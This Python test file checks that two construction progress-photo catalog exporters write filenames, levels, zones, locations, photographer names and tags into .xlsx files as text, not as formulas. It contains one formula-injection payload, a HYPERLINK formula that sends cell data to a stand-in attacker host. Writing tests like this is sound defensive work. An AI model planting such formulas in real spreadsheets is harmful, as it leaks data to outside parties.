"""Spreadsheet formula injection in progress-photo catalog exports.

These tests execute the Python implementations embedded in the skill
documents. They fail while a cataloged filename, level, zone, location,
photographer name, or tag is written into an .xlsx cell as a formula.
They pass once every such value is stored as text and still round-trips
as the original string or that string with one leading apostrophe.

The product does not pin pandas. DataFrame.to_excel selects its writer
with pandas.io.excel._util.get_default_engine. These tests require that
choice to be openpyxl, which is what pandas uses for .xlsx when
xlsxwriter is not installed.

Not covered, because those values are not written to a workbook by the
operations below:

- Field skill SitePhoto.description, activity_code, and file_path.
- Field skill Category, which is PhotoCategory.value rather than a free
  string argument.
- BIM skill zone, photographer, gps_coordinates, and file_path.
- BIM skill progress and safety descriptions, which are constants
  assigned in the analyzer, not the submitted photo strings.
- A tag whose joined Tags cell does not start with "=". openpyxl only
  types a string as a formula when its length is greater than 1 and it
  starts with "=".
"""

from __future__ import annotations

import re
import sys
import tempfile
import types
import unittest
import zipfile
from datetime import datetime
from pathlib import Path
from xml.etree import ElementTree as ET

from pandas.io.excel._util import get_default_engine

REPO_ROOT = Path(__file__).resolve().parents[1]
FIELD_SKILL = (
    "1_DDC_Toolkit/Field-Operations/progress-photo-analyzer/SKILL.md"
)
BIM_SKILL = "1_DDC_Toolkit/BIM-Analysis/progress-photo-analyzer/SKILL.md"
SPREADSHEET_NS = {"m": "http://schemas.openxmlformats.org/spreadsheetml/2006/main"}

# Same shape as a formula a cataloged photo can carry into the export.
PAYLOAD = '=HYPERLINK("https://attacker.example/"&A2,"view")'


def load_skill(relative_path: str) -> dict:
    """Execute the skill document's implementation, not a copy of it.

    The block is registered as a module first because the implementation
    uses dataclasses, which look the class module up in sys.modules.
    """
    source_path = REPO_ROOT / relative_path
    text = source_path.read_text(encoding="utf-8")
    match = re.search(r"```python\n(.*?)```", text, re.DOTALL)
    if match is None:
        raise AssertionError(f"no Python implementation in {relative_path}")
    module_name = "skill_under_test_" + re.sub(r"[^a-z0-9]+", "_", relative_path.lower())
    module = types.ModuleType(module_name)
    module.__file__ = str(source_path)
    sys.modules[module_name] = module
    exec(compile(match.group(1), str(source_path), "exec"), module.__dict__)
    return module.__dict__


def worksheet_formulas(path: Path) -> list[tuple[str, str]]:
    """Return (sheet xml path, formula body) for every formula cell."""
    found = []
    with zipfile.ZipFile(path) as workbook:
        sheet_names = [
            name
            for name in workbook.namelist()
            if name.startswith("xl/worksheets/sheet")
        ]
        for name in sheet_names:
            root = ET.fromstring(workbook.read(name))
            for formula in root.findall(".//m:f", SPREADSHEET_NS):
                found.append((name, formula.text or ""))
    return found


def assert_column_is_text(testcase: unittest.TestCase, path: Path, sheet_name: str, header: str, expected: str) -> None:
    """The payload must survive as text in the named column, never as a formula."""
    formulas = worksheet_formulas(path)
    testcase.assertEqual(
        formulas,
        [],
        f"exported workbook contains formula cells: {formulas}",
    )

    import openpyxl

    workbook = openpyxl.load_workbook(path)
    worksheet = workbook[sheet_name]
    headers = [cell.value for cell in worksheet[1]]
    testcase.assertIn(header, headers)
    column = headers.index(header) + 1
    seen = []
    for row in range(2, worksheet.max_row + 1):
        cell = worksheet.cell(row, column)
        testcase.assertNotEqual(
            cell.data_type,
            "f",
            f"{header} row {row} was stored as a formula: {cell.value!r}",
        )
        seen.append(cell.value)
    accepted = {expected, "'" + expected}
    testcase.assertTrue(
        any(value in accepted for value in seen),
        f"{header} did not preserve {expected!r}; column values were {seen!r}",
    )


class FieldPhotoCatalogFormulaTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.skill = load_skill(FIELD_SKILL)
        cls.analyzer_type = cls.skill["ProgressPhotoAnalyzer"]
        cls.category = cls.skill["PhotoCategory"]

    def setUp(self):
        self.assertEqual(
            get_default_engine("xlsx", mode="writer"),
            "openpyxl",
            "export_catalog does not pass an engine; pandas must be writing xlsx with openpyxl",
        )

    def _export(self, **overrides) -> Path:
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        analyzer = self.analyzer_type("Office Tower")
        fields = {
            "filename": "IMG_001.jpg",
            "captured_date": datetime(2026, 11, 25, 8, 30, 0),
            "category": self.category.PROGRESS,
            "location": "Column Grid B-3",
            "level": "Level 5",
            "captured_by": "Site Super",
            "description": "Pour complete",
            "zone": "Zone A",
            "tags": ["concrete", "forming"],
        }
        fields.update(overrides)
        analyzer.catalog_photo(**fields)
        # A normal photo in the same catalog, so dropping every row is not a fix.
        analyzer.catalog_photo(
            filename="IMG_002.jpg",
            captured_date=datetime(2026, 11, 25, 9, 0, 0),
            category=self.category.SAFETY,
            location="Stair 2",
            level="Level 2",
            captured_by="Safety Lead",
            description="Guardrail check",
            zone="Core",
            tags=["safety"],
        )
        output = Path(directory.name) / "photo_catalog.xlsx"
        analyzer.export_catalog(str(output))
        return output

    def test_catalog_text_is_not_stored_as_a_formula(self):
        cases = [
            ("filename", {"filename": PAYLOAD}, "Filename", PAYLOAD),
            ("level", {"level": PAYLOAD}, "Level", PAYLOAD),
            ("zone", {"zone": PAYLOAD}, "Zone", PAYLOAD),
            ("location", {"location": PAYLOAD}, "Location", PAYLOAD),
            ("captured_by", {"captured_by": PAYLOAD}, "By", PAYLOAD),
            (
                "tags",
                {"tags": [PAYLOAD, "slab"]},
                "Tags",
                f"{PAYLOAD}, slab",
            ),
        ]
        for name, overrides, header, expected in cases:
            with self.subTest(field=name):
                output = self._export(**overrides)
                assert_column_is_text(self, output, "Sheet1", header, expected)

    def test_ordinary_catalog_text_is_unchanged(self):
        output = self._export()
        self.assertEqual(worksheet_formulas(output), [])

        import openpyxl

        worksheet = openpyxl.load_workbook(output).active
        headers = [cell.value for cell in worksheet[1]]
        row = {
            headers[index]: worksheet.cell(2, index + 1).value
            for index in range(len(headers))
        }
        self.assertEqual(row["Filename"], "IMG_001.jpg")
        self.assertEqual(row["Level"], "Level 5")
        self.assertEqual(row["Zone"], "Zone A")
        self.assertEqual(row["Location"], "Column Grid B-3")
        self.assertEqual(row["By"], "Site Super")
        self.assertEqual(row["Tags"], "concrete, forming")
        self.assertEqual(row["Category"], "progress")


class BimPhotoReportFormulaTests(unittest.TestCase):
    """Same unsanitized photo strings in the BIM progress-photo export."""

    @classmethod
    def setUpClass(cls):
        cls.skill = load_skill(BIM_SKILL)
        cls.analyzer_type = cls.skill["ProgressPhotoAnalyzer"]
        cls.photo_type = cls.skill["PhotoType"]

    def _export(self, **overrides) -> Path:
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        analyzer = self.analyzer_type("Office Tower Project")
        fields = {
            "filename": "site_photo_001.jpg",
            "capture_date": datetime(2026, 11, 25, 8, 30, 0),
            "location": "Level 3 - Core",
            "level": "Level 3",
            "zone": "Zone A",
            "photo_type": self.photo_type.PROGRESS,
            "photographer": "Jordan Lee",
        }
        fields.update(overrides)
        metadata = analyzer.register_photo(**fields)
        analyzer.analyze_photo(metadata.photo_id)
        output = Path(directory.name) / "photo_report.xlsx"
        analyzer.export_report(str(output))
        return output

    def test_report_photo_text_is_not_stored_as_a_formula(self):
        cases = [
            ("filename", {"filename": PAYLOAD}, "Filename", PAYLOAD),
            ("location", {"location": PAYLOAD}, "Location", PAYLOAD),
            ("level", {"level": PAYLOAD}, "Level", PAYLOAD),
        ]
        for name, overrides, header, expected in cases:
            with self.subTest(field=name):
                output = self._export(**overrides)
                assert_column_is_text(self, output, "Photos", header, expected)


if __name__ == "__main__":
    unittest.main()
